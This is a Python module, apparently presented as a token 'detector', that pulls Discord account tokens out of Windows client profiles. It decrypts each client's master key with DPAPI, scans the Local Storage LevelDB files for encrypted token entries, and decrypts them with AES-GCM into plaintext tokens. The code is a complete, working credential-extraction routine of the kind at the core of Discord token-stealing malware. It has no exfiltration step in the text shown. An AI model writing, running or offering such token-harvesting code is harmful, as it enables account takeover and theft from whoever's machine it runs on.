"""Detect Discord tokens from local client profiles (Windows)."""

from __future__ import annotations

import base64
import ctypes
import json
import os
import re
from ctypes import wintypes
from dataclasses import dataclass

# Windows BCrypt for AES-256-GCM decryption (no external deps).
bcrypt = ctypes.windll.bcrypt if os.name == "nt" else None


class _DATA_BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_uint), ("pbData", ctypes.POINTER(ctypes.c_char))]


def _unprotect(data: bytes) -> bytes | None:
    if os.name != "nt":
        return None
    blob_in = _DATA_BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_char)))
    blob_out = _DATA_BLOB()
    ok = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
    )
    if not ok:
        return None
    out = ctypes.string_at(blob_out.pbData, blob_out.cbData)
    ctypes.windll.kernel32.LocalFree(blob_out.pbData)
    return out


BCRYPT_AES_ALGORITHM = "AES\0".encode("utf-16-le")
BCRYPT_CHAINING_MODE = "ChainingMode\0".encode("utf-16-le")
BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM\0".encode("utf-16-le")
BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION = 1


class _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.ULONG),
        ("dwInfoVersion", wintypes.ULONG),
        ("pbNonce", ctypes.POINTER(ctypes.c_ubyte)),
        ("cbNonce", wintypes.ULONG),
        ("pbAuthData", ctypes.POINTER(ctypes.c_ubyte)),
        ("cbAuthData", wintypes.ULONG),
        ("pbTag", ctypes.POINTER(ctypes.c_ubyte)),
        ("cbTag", wintypes.ULONG),
        ("pbMacContext", ctypes.POINTER(ctypes.c_ubyte)),
        ("cbMacContext", wintypes.ULONG),
        ("cbAAD", wintypes.ULONG),
        ("cbData", ctypes.c_uint64),
        ("dwFlags", wintypes.ULONG),
    ]


def _bcrypt_aes_gcm_decrypt(key: bytes, nonce: bytes, ciphertext: bytes, tag: bytes) -> bytes | None:
    if bcrypt is None:
        return None
    h_alg = wintypes.HANDLE()
    if bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), BCRYPT_AES_ALGORITHM, None, 0) != 0:
        return None
    try:
        if bcrypt.BCryptSetProperty(
            h_alg, BCRYPT_CHAINING_MODE, BCRYPT_CHAIN_MODE_GCM,
            len(BCRYPT_CHAIN_MODE_GCM), 0,
        ) != 0:
            return None
        h_key = wintypes.HANDLE()
        if bcrypt.BCryptGenerateSymmetricKey(
            h_alg, ctypes.byref(h_key), None, 0, key, len(key), 0
        ) != 0:
            return None
        try:
            nonce_buf = (ctypes.c_ubyte * len(nonce)).from_buffer_copy(nonce)
            tag_buf = (ctypes.c_ubyte * len(tag)).from_buffer_copy(tag)
            info = _BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
            info.cbSize = ctypes.sizeof(info)
            info.dwInfoVersion = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO_VERSION
            info.pbNonce = ctypes.cast(nonce_buf, ctypes.POINTER(ctypes.c_ubyte))
            info.cbNonce = len(nonce)
            info.pbTag = ctypes.cast(tag_buf, ctypes.POINTER(ctypes.c_ubyte))
            info.cbTag = len(tag)

            out_buf = (ctypes.c_ubyte * len(ciphertext))()
            result_len = wintypes.ULONG(0)
            if bcrypt.BCryptDecrypt(
                h_key, ciphertext, len(ciphertext), ctypes.byref(info),
                None, 0, out_buf, len(ciphertext), ctypes.byref(result_len), 0,
            ) != 0:
                return None
            return bytes(out_buf[: result_len.value])
        finally:
            bcrypt.BCryptDestroyKey(h_key)
    finally:
        bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)


@dataclass
class DetectedToken:
    client: str
    token: str


_CLIENTS = {
    "discord": "Discord",
    "discordcanary": "Discord Canary",
    "discordptb": "Discord PTB",
    "vesktop": "Vesktop",
    "Lightcord": "Lightcord",
}


def detect_tokens() -> list[DetectedToken]:
    if os.name != "nt":
        return []
    results: list[DetectedToken] = []
    seen: set[str] = set()

    for folder, label in _CLIENTS.items():
        base = os.path.join(os.environ.get("APPDATA", ""), folder)
        local_state_path = os.path.join(base, "Local State")
        leveldb = os.path.join(base, "Local Storage", "leveldb")
        if not os.path.isfile(local_state_path) or not os.path.isdir(leveldb):
            continue

        try:
            with open(local_state_path, encoding="utf-8") as f:
                state = json.load(f)
            enc_key_b64 = state["os_crypt"]["encrypted_key"]
        except Exception:
            continue

        try:
            enc_key = base64.b64decode(enc_key_b64)
        except Exception:
            continue
        if not enc_key.startswith(b"DPAPI"):
            continue
        master = _unprotect(enc_key[5:])
        if not master:
            continue

        # scan leveldb files
        data = bytearray()
        for name in os.listdir(leveldb):
            if name.endswith((".ldb", ".log")):
                try:
                    with open(os.path.join(leveldb, name), "rb") as f:
                        data += f.read()
                except OSError:
                    pass

        for m in re.finditer(rb"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)", bytes(data)):
            try:
                raw = base64.b64decode(m.group(1))
            except Exception:
                continue
            if len(raw) < 3 + 12 + 16 or raw[:3] not in (b"v10", b"v11"):
                continue
            nonce = raw[3:15]
            ct = raw[15:-16]
            tag = raw[-16:]
            try:
                token = _bcrypt_aes_gcm_decrypt(master, nonce, ct, tag)
                if token is None:
                    continue
                token = token.decode("utf-8")
            except Exception:
                continue
            if token and token not in seen:
                seen.add(token)
                results.append(DetectedToken(client=label, token=token))

    return results